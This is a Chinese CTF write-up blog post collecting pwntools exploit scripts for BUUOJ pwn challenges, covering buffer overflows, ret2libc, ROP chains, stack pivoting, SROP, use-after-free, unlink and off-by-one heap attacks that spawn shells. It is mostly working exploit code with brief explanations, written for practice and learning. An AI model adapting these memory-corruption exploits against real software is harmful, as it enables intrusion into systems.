---
title: BUUOJ pwn(不定期更新)
date: 2019-12-12 11:37:00
tags: pwn
top: 3
---
<!-- more -->
## 0x01 rip覆盖一下  
```Python
from pwn import *
context.log_level = 'debug'
p=remote("node3.buuoj.cn",27714)
payload = "a"*23 + p64(0x40118A)
p.sendline(payload)
p.interactive()
``` 

## 0x02 warmup_csaw_2016  
```Python
from pwn import*
#context.log_level = 'debug'
elf=ELF("./warmup_csaw_2016")
#p=process("./warmup_csaw_2016")
p=remote("node3.buuoj.cn",26890)
p.recvuntil(">")
payload = "a"*72 + p64(0x40060D)
p.sendline(payload)
sleep(0.1)
p.interactive()
``` 

## 0x03  ciscn_2019_n_1
很典型的64位ret2libc  
```Python
# -*- coding: utf-8 -*-
from pwn import*
#context.log_level = 'debug'
p=remote("node3.buuoj.cn",29434)
p=process('./ciscn_2019_n_1')
elf=ELF('./ciscn_2019_n_1')
libc=ELF('libc-2.27.so')

pop_rdi_ret = 0x0000000000400793 

payload = "a"*0x38 + p64(pop_rdi_ret) + p64(elf.got['__libc_start_main']) + p64(elf.plt['puts']) + p64(elf.symbols['main'])

p.recvuntil("number.\n")
p.sendline(payload)

puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
print "puts_addr:" + hex(puts_addr)
offset = puts_addr - libc.symbols['__libc_start_main']
sys_addr = offset + libc.symbols['system']
print "sys_addr:" + hex(sys_addr)
binsh_addr = libc.search('/bin/sh').next() + offset
print "binsh_addr:" + hex(binsh_addr)

payload = "a"*0x38 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)

p.recvuntil("number.\n")
p.sendline(payload)
#sleep(0.1)
p.interactive()
``` 

如果在没有libc的情况下也可以把/bin/sh字符串写入一个段内去执行system("/bin/sh")  

```Python
# -*- coding: utf-8 -*-
from pwn import*
#context.log_level = 'debug'
p=remote("node3.buuoj.cn",29434)
p=process('./ciscn_2019_n_1')
elf=ELF('./ciscn_2019_n_1')
pop_rdi_ret = 0x0000000000400793
bss_start = elf.bss()
gets = elf.plt['gets']
sys_addr = elf.plt['system']
payload = "a"*0x38 + p64(pop_rdi_ret) + p64(bss_start) + p64(gets) 
payload += p64(pop_rdi_ret) + p64(bss_start) + p64(sys_addr) 
p.sendline(payload)
p.sendline("/bin/sh\x00")
p.interactive()
```  

## 0x04  [HarekazeCTF2019]baby_rop2
差点把babyrop做成了这题，后来才发现babyrop有/bin/sh字符串……   
这题用了printf泄露__libc_start_main函数的地址，特别的地方在于布置printf的两个参数，是以前没有做过的。另外，one_gadget真香！
```python
#!/usr/bin/env python2
#conding=utf-8
from pwn import*
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
p=remote("node3.buuoj.cn",25892)
#p = process("./babyrop2")
elf = ELF("./babyrop2")
libc = elf.libc
pop_rdi_ret = 0x0000000000400733
pop_rsi_r15 = 0x0000000000400731
string = 0x400770  #printf的"%s"参数

padding = "a"*0x28
payload = padding 
payload += p64(pop_rdi_ret) 
payload += p64(string) 
payload += p64(pop_rsi_r15) 
payload += p64(elf.got['__libc_start_main'])  # 用__libc_start_main的got地址作为printf的第二个参数
payload += "a"*8  # 没有单独的pop_rsi_ret，所以r15里面要放一个垃圾值
payload += p64(elf.plt['printf']) 
payload += p64(elf.symbols['main'])
#gdb.attach(p)
p.sendline(payload)

__libc_start_main_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
base = __libc_start_main_addr - libc.symbols['__libc_start_main']
log.success("__libc_start_main_addr==>" + hex(__libc_start_main_addr))
log.success("base==>" + hex(base))

one_gadget = base + 0x45216
payload1 = padding + p64(one_gadget)
p.sendline(payload1)
p.interactive()
```  
## 0x05 BWrqt--spwn
详见栈迁移学习文章  
[spwn](https://lyp0000.github.io/2020/01/17/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%AD%A6%E4%B9%A0/#more)  
## 0x06  bjdctf_2020_babystack2   
先看一下main函数  
![](bjdctf_2020_babystack2_1.png)
可以看到read的最后一个参数是需要我们输入长度的，但是下面对于长度有一个if条件检测，不能大于10。但是我们需要让nbytes起码要大于0x10才能溢出。所以我们需要输入"-1"，输入-1的原因是因为read的最后一个参数是unsigned int类型，0是最小值，输入-1的话他会变成最大值，这个数字很大很大，必然能造成溢出，而且-1 < 10 也能绕过if的检测，这题又学到了东西。  
贴出exp  
```python  
from pwn import*
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
#p=remote("node3.buuoj.cn",27823)
p=process("./bjdctf_2020_babystack2")
elf=ELF("./bjdctf_2020_babystack2")
libc=elf.libc
padding = "a"*0x10 + "a"*8
p.recvuntil("name:\n")
p.sendline("-1")
p.recvuntil("name?\n")
payload = padding + p64(0x400726)
p.sendline(payload)
p.interactive()  
```  
## 0x07 hitcontraining_uaf
UAF漏洞，修改小note的puts字段之后，只要执行print_note函数，就可以执行magic函数  
```python  
#coding=utf-8
from pwn import*
from LibcSearcher import*
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
#p=process("./hacknote")
#p=remote("node3.buuoj.cn",25290)
elf=ELF("./hacknote")
magic = 0x8048986

def add(size,content):
    p.recvuntil("choice :")
    p.sendline("1")
    p.recvuntil("size :")
    p.sendline(str(size))
    p.recvuntil("Content :")
    p.sendline(content)

def delete(index):
    p.recvuntil("choice :")
    p.sendline("2")
    p.recvuntil("Index :")
    p.sendline(str(index))

def view(index):
    p.recvuntil("choice :")
    p.sendline("3")
    p.recvuntil("Index :")
    p.sendline(str(index))

add(16,"aaa")
add(16,"bbb")

delete(0)
delete(1)

add(8,p32(magic))
view(0)

p.interactive()
```  
## 0x08 pwnable_hacknote  
```python
#coding=utf-8
from pwn import*
from LibcSearcher import*
#context.log_level = 'debug'
p=process("./hacknote")
#p=remote("node3.buuoj.cn",29406)
elf=ELF("./hacknote")
puts = 0x804862B

def add(size,content):
    p.recvuntil("choice :")
    p.sendline("1")
    p.recvuntil("size :")
    p.sendline(str(size))
    p.recvuntil("Content :")
    p.sendline(content)

def delete(index):
    p.recvuntil("choice :")
    p.sendline("2")
    p.recvuntil("Index :")
    p.sendline(str(index))

def view(index):
    p.recvuntil("choice :")
    p.sendline("3")
    p.recvuntil("Index :")
    p.sendline(str(index))

add(16,"aaa")
add(16,"bbb")

delete(0)
delete(1)

add(8,p32(puts)+p32(elf.got['puts']))
view(0)

puts_addr = u32(p.recvuntil("\xf7")[-4:])
libc = LibcSearcher("puts",puts_addr)
offset = puts_addr - libc.dump('puts')
system_addr = offset + libc.dump('system')
log.success("puts_addr==>" + hex(puts_addr))
log.success("system_addr==>" + hex(system_addr))

delete(2)
add(8,p32(system_addr)+";sh")
view(0)

p.interactive()  
```  
## 0x09 gyctf_2020_borrowstack  
i春秋的抗击疫情公益赛，栈迁移，不是自己做出来的，挖坑待填……武汉加油！  
据说执行完puts函数之后，read的got表被改写了，导致rip变成了0，所以需要往后挪挪位置……  
```  
因为迁移之后函数调用会让栈增高，表现出来的就是bss的低地址会被拿来放一些数据，所以read_got就被改了
```   
后面再补充，还没理解  
```python  
#coding=utf-8
from pwn import*
from LibcSearcher import*
#context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
p=process("./borrowstack")
#p=remote("node3.buuoj.cn",26086)
#p=remote("123.56.85.29",3635)
elf = ELF("./borrowstack")
libc = elf.libc
leave_ret = 0x400699
pop_rdi_ret = 0x400703
pop_rsi_r15 = 0x400701
ret = 0x00000000004004c9
ret = p64(ret)
buf = elf.bss() + 0x300

p.recvuntil("want\n")
p.send("a"*0x60 + p64(0x601080) + p64(leave_ret))
p.recvuntil("now!\n")
payload = p64(buf) +ret+ret+ret+ret+ret+ret+ p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) 
payload += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15) + p64(buf) + p64(0) + p64(elf.plt['read']) 
payload += p64(leave_ret)
#gdb.attach(p)
p.send(payload)

puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
log.success("puts_addr==>" + hex(puts_addr))
libc_base = puts_addr - libc.sym['puts']
sys_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + libc.search("/bin/sh").next()
one_gadget = libc_base + 0xf1147 

p.send(p64(0xdeadbeef) + p64(one_gadget))

p.interactive()

```  
## 0x10  ciscn_2019_es_7/ciscn_2019_s_3  
SROP一把梭    
```python  
from pwn import*
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
context.arch = 'amd64'
p=remote("node3.buuoj.cn",27476)
#p = process("./ciscn_2019_es_7")
elf = ELF("./ciscn_2019_es_7")
libc = ELF("/home/N0vice/Desktop/BUUCTF/libc-2.27.so")
syscall_addr = 0x0000000000400517
st_sigreturn = 0x00000000004004da
main_addr = elf.symbols['main']
#gdb.attach(p)
payload = "/bin/sh\x00" + "\x00"*8 + p64(0x4004EE) 
p.send(payload)
p.recv(32)
stack_addr = u64(p.recv(8))
stack_addr = stack_addr - 280
log.success('stack_addr==>' + hex(stack_addr))

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = stack_addr
frame.rsi = 0
frame.rdx = 0
frame.rsp = stack_addr
frame.rip = syscall_addr

payload = "a"*16 + p64(st_sigreturn) + p64(syscall_addr) + str(frame)
p.send(payload)
p.interactive()
```  
## 0x11  hitcon2014_stkof  
unlink，通过从chunk_mem_addr的指针指向的地方开始修改，即从0x602138开始修改，然后将三个数组分别改成free_got,puts_got,atoi_got三个got表，然后再通过修改chunk1，把free_got改写为puts_plt，然后执行free函数就会泄露puts函数地址，最后改atoi函数的got为one_gadget，只要输入选项就会执行atoi函数，即执行one_gadget  
```python  
from pwn import*
#context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
context.arch = 'amd64'
#p=remote("node3.buuoj.cn",25166)
p = process("./stkof")
elf = ELF("./stkof")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
bss = 0x602140 + 0x10
free_got=elf.got['free']
puts_got=elf.got['puts']
atoi_got=elf.got['atoi']
puts_plt=elf.plt['puts']
def add(size):
    p.sendline("1")
    p.sendline(str(size))
    p.recvuntil("OK\n")
def free(idx):
    p.sendline("3")
    p.sendline(str(idx))
def edit(idx,size,content):
    p.sendline("2")
    p.sendline(str(idx))
    p.sendline(str(size))
    p.send(content)
    p.recvuntil("OK\n")

add(0x10)
add(0x30)
add(0x80)

payload = p64(0) + p64(0x31) + p64(bss-0x18) + p64(bss-0x10)
payload += "a"*0x10
payload += p64(0x30) + p64(0x90)

edit(2,len(payload),payload)
free(3)
p.recvuntil('OK\n')
payload = p64(0)*2 + p64(free_got) + p64(puts_got) + p64(atoi_got) 
edit(2,len(payload),payload)
gdb.attach(p)
payload = p64(puts_plt)
edit(1,len(payload),payload)
#gdb.attach(p)
free(2)

puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
log.success('puts addr: '+hex(puts_addr))
libc_base = puts_addr - libc.symbols['puts']
log.success('libc_base: '+hex(libc_base))
one_gadget = libc_base + 0x4526a
payload = p64(one_gadget)
edit(3,len(payload),payload)
p.interactive()
```  
## 0x12  actf_2019_babystack  
栈迁移，溢出只能控制到eip，然后题中会泄露栈地址，我们用泄露出的栈地址吧rbp覆盖掉，然后rip指向leave_ret，栈就会迁移到上面read读进去的地方，然后在read读进去的地方执行我们的rop链
```Python  
from pwn import*
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
#p=remote("node3.buuoj.cn",25727)
p=process("./ACTF_2019_babystack")
elf=ELF("./ACTF_2019_babystack")
libc=ELF("/home/N0vice/Desktop/BUUCTF/libc-2.27.so")
#libc=elf.libc
leave_ret = 0x0000000000400a18
pop_rdi_ret = 0x0000000000400ad3
p.recvuntil("?\n")
p.sendline("224")
p.recvuntil('saved at')
p.recvuntil("0x")
stack_addr = int(p.recvline(),16)
#stack_addr = int((p.recvline_contains('0x7f')),16)
log.success("stack_addr==>" + hex(stack_addr))

payload = p64(0) + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x4008F6) # main_addr
payload += "a"*(0xD0 - len(payload))
payload += p64(stack_addr) + p64(leave_ret)
p.recvuntil('>')
p.send(payload)

puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) # leak puts_addr
libc_base = puts_addr - libc.sym['puts']
log.success("puts_addr==>" + hex(puts_addr))

p.recvuntil("?\n")
p.sendline("224")
p.recvuntil('saved at')
p.recvuntil("0x")
stack_addr = int(p.recvline(),16)
log.success("stack_addr==>" + hex(stack_addr))

# 0x4f2c5 0x4f322 0x10a38c
one_gadget = libc_base + 0x4f2c5
payload = p64(0) + p64(one_gadget)
payload += "a"*(0xD0 - len(payload))
payload += p64(stack_addr) + p64(leave_ret)
p.recvuntil('>')
p.send(payload)

p.interactive()
```  
## 0x13 pwnable_orw  
orw一把梭  
```Python  
from pwn import*
#p=process("pwnable_orw")
p=remote("node3.buuoj.cn",28753)
orw = asm(shellcraft.open("flag", 0))
orw += asm(shellcraft.read(3, 0x804a040, 0x100))
orw += asm(shellcraft.write(1, 0x804a040, 0x100))
orw += asm(shellcraft.exit(0))

p.sendafter("shellcode:", orw)
p.interactive()
```  
## 0x14  get_started_3dsctf_2016 && not_the_same_3dsctf_2016
这两题都是一样的套路，用mprotect函数改一块可读可写的区域的权限为可读可写可执行，然后写shellcode,这里要提一下，为了使堆栈还原，所以调用mprotect函数之后要用pop保证堆栈平衡，因为push了3个参数，所以要用pop三个寄存器  
```Python  
#coding=utf-8
from pwn import*
context.log_level = 'debug'
context.terminal = ('terminator','-x','sh','-c')
#p = remote("node3.buuoj.cn",27219)
p=process("./get_started_3dsctf_2016")
elf = ELF("./get_started_3dsctf_2016")
addr = 0x80ea000
pop3ret = 0x0804f460 #pop_ebx_esi_ebp_ret 其实只要找一个pop三个寄存器的gadget就行了
payload = "a"*0x38
payload += p32(elf.sym['mprotect']) + p32(pop3ret) + p32(addr) + p32(0x2000) + p32(7)
payload += p32(elf.sym['read']) + p32(pop3ret) + p32(0) + p32(addr) + p32(0x200) + p32(addr)
sleep(0.01)
#p.recvline()
p.sendline(payload)
#gdb.attach(p)
payload = asm(shellcraft.sh())
p.send(payload)
p.interactive()
```  
   
```Python   
from pwn import*
context.log_level = 'debug'
context.terminal = ('terminator','-x','sh','-c')
p = remote("node3.buuoj.cn",26187)
#p=process("./not_the_same_3dsctf_2016")
elf = ELF("./not_the_same_3dsctf_2016")
addr = 0x80ea000
pop3ret = 0x0804f420
payload = "a"*45
payload += p32(elf.sym['mprotect']) + p32(pop3ret) + p32(addr) + p32(0x2000) + p32(7)
payload += p32(elf.sym['read']) + p32(pop3ret) + p32(0) + p32(addr) + p32(0x200) + p32(addr)
sleep(0.01)
#p.recvline()
p.sendline(payload)
#gdb.attach(p)
payload = asm(shellcraft.sh())
p.send(payload)
p.interactive()
```  
## 0x15  hitcontraining_heapcreator
off-by-one改下一个chunk的size，然后overlapping，布置free_got到chunk1中，然后show(1)泄露free_addr，接着改free_got为system。/bin/sh已经放在了第一个chunk中  
因为本题是off-by-one，只能溢出一个字节，所以必须要用\x41，不能用p64(0x41)，p64是8个字节    
```python  
#coding=utf-8
from pwn import *
context.terminal = ['terminator','-x','sh','-c']
#p = process('./heapcreator')
p=remote("node3.buuoj.cn",29112)
elf = ELF('./heapcreator')
libc = elf.libc

def create(size, content):
    p.recvuntil(":")
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(str(size))
    p.recvuntil(":")
    p.sendline(content)

def edit(idx, content):
    p.recvuntil(":")
    p.sendline("2")
    p.recvuntil(":")
    p.sendline(str(idx))
    p.recvuntil(":")
    p.sendline(content)

def show(idx):
    p.recvuntil(":")
    p.sendline("3")
    p.recvuntil(":")
    p.sendline(str(idx))

def delete(idx):
    p.recvuntil(":")
    p.sendline("4")
    p.recvuntil(":")
    p.sendline(str(idx))

free_got = 0x602018
create(0x18,"aaaa")
create(0x10,"bbbb")
payload = "/bin/sh\x00" + "a"*0x10 + '\x41'  # 不能用p64(0x41)
edit(0,payload)
delete(1)
payload = p64(0)*3 +p64(0x21)+p64(0x30)+ p64(free_got)
create(0x30,payload)
show(1)

free_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
#free_addr = u64(p.recvuntil('\n', drop=True).ljust(8, '\x00'))
libc_base = free_addr - libc.sym['free']
system_addr = libc_base + libc.sym['system']
log.success("free_addr==>" + hex(free_addr))
log.success("system_addr==>" + hex(system_addr))
payload = p64(system_addr)
edit(1,payload)
delete(0)
#gdb.attach(p)
p.interactive()
```  
## 0x16  
咕咕咕……  